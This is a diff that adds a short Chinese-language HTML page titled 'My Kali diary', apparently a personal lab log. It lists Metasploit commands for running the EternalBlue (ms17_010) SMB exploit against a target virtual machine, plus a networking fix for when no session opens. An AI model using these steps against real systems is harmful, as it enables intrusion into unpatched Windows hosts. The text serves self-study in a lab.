@@ -1,0 +1,45 @@
+<!doctype html>
+<html>
+<head>
+    <title>我的kali日记</title>
+<meta charset="utf-8">
+</head>
+<body>
+<div style="font-size:20px">
+    <a href="#2023/8/20">
+        2023/8/20
+    </a><br/>
+    <a href="#pcrj"></a><br/>
+    <a href="#sjb">
+
+    </a>
+</div>
+
+<div  id="2023/8/20" style="font-size:25px;">
+    <p>
+        <b>2023/8/20</b><br/>
+        Kali Linux 系统虚拟机文件：从网上找。<br/>
+        从MSDN找iso映像文件：作为靶机。<br/>
+        进入终端：右击点 Open Terminal Here; <br/>
+        打开ROOT权限：sudu su ，回车后输密码<br/>
+        打开msf工具： msfconsole ; <br/>
+        找到SMB漏洞 ： search ms17_010 <br/>
+        使用 “永恒之蓝（eternalblue）” ： use 0 <br/>
+        查看设置项：shou options 或 options <br/>
+        设置攻击目标  :  set RHOSTS  **.**.**.**<br/>
+        本地监听地址：  LHOST <br/>
+        监听端口：LPORT <br/>
+        漏洞系统类型 show targets <br/>
+        设置 set target *<br/>
+        攻击目标 run <br/>
+        问题：为什么攻击之后，会出现Exploit completed， but no session was created？
+        <br/>我发现，把VMware虚拟机的网络适配器由net改为桥段就没毛病了。
+    </p>
+</div>
+
+<hr>
+
+
+
+</body>
+</html>
